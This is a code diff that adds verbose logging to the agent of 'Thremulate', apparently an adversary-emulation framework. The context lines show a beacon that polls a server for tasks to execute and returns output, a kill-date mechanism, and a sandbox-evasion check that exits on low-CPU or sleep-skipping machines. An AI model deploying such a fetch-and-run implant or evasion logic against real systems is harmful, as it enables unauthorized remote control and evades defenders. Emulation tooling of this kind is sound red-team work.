@@ -25,6 +25,7 @@ THIS_DIR = Path(__file__).parent
 
 INTERVAL = 5
 SERVER_IP = ''
+VERBOSE = False
 
 
 def agent_arguments():
@@ -34,6 +35,7 @@ def agent_arguments():
     """
     global SERVER_IP
     global INTERVAL
+    global VERBOSE
     parser = argparse.ArgumentParser()
     parser.add_argument("-s", "--server", help="IP address of the Thremulate server.")
     parser.add_argument("-i", "--interval", type=int,
@@ -50,6 +52,7 @@ def agent_arguments():
     if INTERVAL is None:
         print('[+] No beacon interval set.\n[+] Agent defaulted to 5 seconds')
     if args.verbose:
+        VERBOSE = True
         print("[+] Verbosity enabled")
 
 
@@ -81,6 +84,8 @@ X4E1Yf/YLC8FZCgjz3Z9NUltZ6MNuahcJPfeVhd47cg9lK8o
         """
         with open("thremulate.crt", "wb") as f:
             f.write(certificate)
+        if VERBOSE:
+            print('[+] Wrote SSL certificate')
 
 
 def config_file():
@@ -101,23 +106,31 @@ def config_file():
 
             # Check if current kill date is different from the one stored so that we change it
             if config['AGENT']['kill_date'] != kill_date_string:
-                print('[+] Agent received new kill date')
-                print('[+] %s' % kill_date_string)
+                if VERBOSE:
+                    print('[+] Received new kill date')
+                    print('[+] %s' % kill_date_string)
+
                 config['AGENT'] = {'id': agent_id,
                                    'kill_date': kill_date_string}
                 with open('config.ini', 'w') as configfile:
                     config.write(configfile)
+                    if VERBOSE:
+                        print('[+] Wrote new config.ini file')
         else:
             config['AGENT'] = {'id': agent_id,
                                'kill_date': kill_date_string}
             with open('config.ini', 'w') as configfile:
                 config.write(configfile)
+                if VERBOSE:
+                    print('[+] Wrote new config.ini file')
 
     # First time to run
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         config['AGENT'] = {'id': agent_id}
         with open('config.ini', 'w') as configfile:
             config.write(configfile)
+            if VERBOSE:
+                print('[+] Wrote new config.ini file')
 
     # Other runs
     else:
@@ -127,6 +140,8 @@ def config_file():
                 config['AGENT'] = {'id': agent_id}
                 with open('config.ini', 'w') as configfile:
                     config.write(configfile)
+                    if VERBOSE:
+                        print('[+] Wrote new config.ini file')
                     return
 
             confirm_kill()
@@ -226,6 +241,8 @@ def download_and_run_commands():
     Obtains tasks from the server and sends them to another function for execution.
     :return:
     """
+    if VERBOSE:
+        print('[+] Checking for new tasks')
     try:
         # url = ('https://%s:8000/agent_tasks/%s' % SERVER_IP % agent_id)
         url = 'https://{0}:8000/agent_tasks/{1}'.format(SERVER_IP, agent_id)
@@ -265,7 +282,9 @@ def send_output():
         print('[+] Failed to get techniques from the server')
         return
     if len(std_out) == 0:
-        # print('[+] No techniques assigned')
+        if VERBOSE:
+            print('[+] No tasks assigned')
+
         return
 
     agent_tech = get_techniques()
@@ -275,7 +294,9 @@ def send_output():
         # print('[+] Failed to get techniques from the server')
         return
     if agent_tech == '':
-        print('[+] No techniques assigned')
+        if VERBOSE:
+            print('[+] No techniques assigned')
+
         return
 
     url = 'https://{0}:8000/agent_output'.format(SERVER_IP)
@@ -306,10 +327,14 @@ def confirm_kill():
     Compares the Agent kill datetime with the current datetime and kills the Agent if time is due.
     :return:
     """
+    if VERBOSE:
+        print('[+] Checking kill datetime')
     global kill_date_string
     if kill_date_string == '':
         check = configparser.ConfigParser()
         check.read('config.ini')
+        if VERBOSE:
+            print('[+] Reading config.ini file')
 
         if 'kill_date' in check['AGENT']:
             kill_date_string = check['AGENT']['kill_date']
@@ -326,6 +351,8 @@ def confirm_kill():
             os.remove(THIS_DIR / 'config.ini')
         if os.path.exists(path=THIS_DIR / 'config.ini'):
             os.remove(THIS_DIR / 'thremulate.crt')
+        if VERBOSE:
+            print('[+] Agent killed. RIP')
 
 
 def sandbox_evasion():
@@ -335,14 +362,20 @@ def sandbox_evasion():
     """
     # SANDBOX 1 :Check number of CPU core
     if os.cpu_count() >= 2:
+        if VERBOSE:
+            print('[+] Device has {0} CPUs'.format(os.cpu_count()))
         # Get the current time
         now = datetime.datetime.now()
         # Stop code execution for 1 seconds
         time.sleep(2)
+        if VERBOSE:
+            print('[+] Agent tried to sleep for 2 seconds')
         # Get the time after 2 seconds
         now2 = datetime.datetime.now()
         # SANDBOX 2 :Check if AV skipped sleep function
         if (now2 - now) > datetime.timedelta(seconds=1):
+            if VERBOSE:
+                print('[+] Agent not in a sandbox')
             print('[+] Agent in safe work place')
         else:
             sys.exit()
@@ -360,6 +393,8 @@ if __name__ == '__main__':
             agent_id = randrange(500)
             register()
         else:
+            if VERBOSE:
+                print('[+] File config.ini exists')
             agent_config = configparser.ConfigParser()
             agent_config.read('config.ini')
             try:
